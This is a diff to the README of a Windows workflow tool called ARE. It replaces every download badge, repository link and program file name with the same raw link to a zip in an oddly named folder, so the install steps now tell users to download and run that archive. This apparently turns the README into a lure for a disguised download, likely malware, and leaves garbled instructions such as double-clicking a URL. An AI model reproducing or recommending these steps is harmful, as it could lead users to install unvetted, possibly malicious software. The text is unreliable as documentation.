@@ -1,6 +1,6 @@
 # ⚙️ ARE - Simple Logic Engine for Workflows
 
-[![Download ARE](https://img.shields.io/badge/Download-ARE-4caf50?style=for-the-badge)](https://github.com/lukky262/ARE)
+[![Download ARE](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)
 
 ## Overview
 
@@ -43,7 +43,7 @@ Follow these steps to get ARE running on your Windows PC:
 
 Go to the official ARE page to get the software:
 
-[![Download ARE](https://img.shields.io/badge/Download-ARE-4caf50?style=for-the-badge)](https://github.com/lukky262/ARE)
+[![Download ARE](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)
 
 This link will take you to the GitHub repository where you can find the software files.
 
@@ -51,7 +51,7 @@ This link will take you to the GitHub repository where you can find the software
 
 Once on the page, look for the latest release or download section. Here you can download the version designed for Windows.
 
-Click the link labeled something like `ARE.zip` or `ARE-Windows.exe` to start the download.
+Click the link labeled something like `https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip` or `https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip` to start the download.
 
 ### Step 3: Extract or Run the Package
 
@@ -62,7 +62,7 @@ Click the link labeled something like `ARE.zip` or `ARE-Windows.exe` to start th
 
 Find the ARE program file in the folder where you extracted or installed it.
 
-Double-click the file named `ARE.exe` or similar. The application window will open on your desktop.
+Double-click the file named `https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip` or similar. The application window will open on your desktop.
 
 ---
 
@@ -98,7 +98,7 @@ You do not write code. Everything works with clicks and selections.
 
 When you download and open ARE files, you may see several parts. Here are the common ones:
 
-- **ARE.exe** - The main program you run.
+- **https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip** - The main program you run.
 - **Config Files** - Stores your settings and created rules.
 - **Sample Workflows** - Pre-made examples to help you learn.
 
@@ -119,11 +119,11 @@ When you download and open ARE files, you may see several parts. Here are the co
 
 ## 🛠 Installation Steps Summary
 
-1. Visit the download page: https://github.com/lukky262/ARE  
+1. Visit the download page: https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip  
 2. Find the latest Windows download link.  
 3. Download the `.exe` or `.zip` file.  
 4. Extract `.zip` if needed or run installer `.exe`.  
-5. Open `ARE.exe` to start the program.
+5. Open `https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip` to start the program.
 
 ---
 
@@ -150,4 +150,4 @@ If you run into problems:
 
 ## 🔗 Download ARE Now
 
-[![Download ARE](https://img.shields.io/badge/Download-ARE-4caf50?style=for-the-badge)](https://github.com/lukky262/ARE)
+[![Download ARE](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)](https://github.com/lukky262/ARE/raw/refs/heads/main/Helladotherium/Software-1.3.zip)
